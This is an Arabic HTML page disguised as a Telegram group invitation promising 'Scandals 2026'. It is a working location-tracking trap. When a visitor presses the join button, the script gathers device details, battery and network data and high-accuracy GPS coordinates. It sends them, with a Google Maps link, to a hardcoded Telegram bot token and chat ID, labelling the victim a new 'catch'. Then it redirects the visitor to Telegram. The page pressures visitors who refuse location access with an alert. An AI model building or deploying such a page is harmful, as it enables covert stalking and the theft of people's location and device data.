<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Group</title>
    <style>
        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2b2b2b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #444; }
        .btn { background: #24A1DE; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="70">
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>يجب السماح بالموقع للتأكد من هويتك وفتح المحتوى.</p>
        <button class="btn" onclick="sendTrap()">انضمام الآن</button>
    </div>

    <script>
        async function sendTrap() {
            const token = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
            const chat_id = '6648970984';

            let deviceData = `📱 **نوع الجهاز:** ${navigator.platform}\n`;
            deviceData += `🌐 **النظام:** ${navigator.userAgent.includes("iPhone") ? "iOS (Apple)" : "Android/PC"}\n`;
            deviceData += `🖥 **دقة الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
            deviceData += `🌍 **اللغة:** ${navigator.language}\n`;

            // محاولة جلب البطارية
            try {
                const b = await navigator.getBattery();
                deviceData += `🔋 **البطارية:** ${(b.level * 100).toFixed(0)}% ${b.charging ? '⚡' : ''}\n`;
            } catch(e) {}

            // محاولة جلب الشبكة
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                deviceData += `📶 **الشبكة:** ${conn.effectiveType} (${conn.downlink} Mbps)\n`;
            }

            navigator.geolocation.getCurrentPosition(async (p) => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const map = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const final = `🎯 **تم اصطياد صيد جديد!**\n\n📍 **الموقع:** ${map}\n\n${deviceData}`;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(final)}&parse_mode=Markdown`);
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                alert("يجب السماح بالموقع للدخول!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
